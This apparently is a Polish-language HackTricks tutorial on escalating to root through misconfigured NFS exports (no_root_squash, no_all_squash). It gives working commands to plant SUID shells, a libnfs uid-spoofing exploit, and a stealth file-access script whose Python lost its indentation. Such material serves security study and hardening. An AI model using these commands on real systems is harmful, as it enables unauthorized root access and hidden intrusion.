{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


Przeczytaj plik _ **/etc/exports** _ , jeśli znajdziesz jakiś katalog skonfigurowany jako **no\_root\_squash**, wtedy możesz **uzyskać dostęp** do niego **jako klient** i **zapisać w** tym katalogu **jakbyś był** lokalnym **rootem** maszyny.

**no\_root\_squash**: Ta opcja zasadniczo daje uprawnienia użytkownikowi root na kliencie do dostępu do plików na serwerze NFS jako root. Może to prowadzić do poważnych implikacji bezpieczeństwa.

**no\_all\_squash:** To jest podobne do opcji **no\_root\_squash**, ale dotyczy **użytkowników niebędących rootem**. Wyobraź sobie, że masz powłokę jako użytkownik nobody; sprawdziłeś plik /etc/exports; opcja no\_all\_squash jest obecna; sprawdź plik /etc/passwd; emuluj użytkownika niebędącego rootem; utwórz plik suid jako ten użytkownik (montując za pomocą nfs). Wykonaj suid jako użytkownik nobody i stań się innym użytkownikiem.

# Podwyższenie uprawnień

## Zdalny exploit

Jeśli znalazłeś tę lukę, możesz ją wykorzystać:

* **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **jako root skopiowanie** do zamontowanego folderu binarnego **/bin/bash** i nadanie mu praw **SUID**, a następnie **wykonanie z maszyny ofiary** tego binarnego bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **jako root skopiowanie** do zamontowanego folderu naszego skompilowanego ładunku, który wykorzysta uprawnienia SUID, nada mu **uprawnienia SUID** i **wykonanie z maszyny ofiary** tego binarnego pliku (możesz znaleźć tutaj kilka [ładunków C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

{% hint style="info" %}
Zauważ, że jeśli możesz stworzyć **tunel z twojej maszyny do maszyny ofiary, nadal możesz użyć wersji zdalnej, aby wykorzystać tę eskalację uprawnień, tunelując wymagane porty**.\
Następujący trik dotyczy sytuacji, gdy plik `/etc/exports` **wskazuje na adres IP**. W takim przypadku **nie będziesz mógł użyć** w żadnym przypadku **eksploatu zdalnego** i będziesz musiał **wykorzystać ten trik**.\
Innym wymaganym warunkiem, aby eksploatacja działała, jest to, że **eksport w `/etc/export`** **musi używać flagi `insecure`**.\
\--_Nie jestem pewien, czy jeśli `/etc/export` wskazuje na adres IP, ten trik zadziała_--
{% endhint %}

## Basic Information

Scenariusz polega na wykorzystaniu zamontowanego udziału NFS na lokalnej maszynie, wykorzystując lukę w specyfikacji NFSv3, która pozwala klientowi określić swój uid/gid, co potencjalnie umożliwia nieautoryzowany dostęp. Eksploatacja polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki, która umożliwia fałszowanie wywołań RPC NFS.

### Compiling the Library

Kroki kompilacji biblioteki mogą wymagać dostosowań w zależności od wersji jądra. W tym konkretnym przypadku wywołania syscalls fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Przeprowadzanie Eksploitu

Eksploit polega na stworzeniu prostego programu C (`pwn.c`), który podnosi uprawnienia do roota, a następnie uruchamia powłokę. Program jest kompilowany, a wynikowy plik binarny (`a.out`) jest umieszczany na udostępnieniu z suid root, używając `ld_nfs.so` do fałszowania uid w wywołaniach RPC:

1. **Skompiluj kod eksploitu:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Umieść exploit na udostępnieniu i zmodyfikuj jego uprawnienia, fałszując uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Wykonaj exploit, aby uzyskać uprawnienia roota:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell dla Dyskretnego Dostępu do Plików
Gdy uzyskano dostęp roota, aby interagować z udostępnieniem NFS bez zmiany właściciela (aby uniknąć pozostawiania śladów), używany jest skrypt Pythona (nfsh.py). Skrypt ten dostosowuje uid, aby odpowiadał uid pliku, do którego uzyskuje się dostęp, co pozwala na interakcję z plikami na udostępnieniu bez problemów z uprawnieniami:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Uruchom jak:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
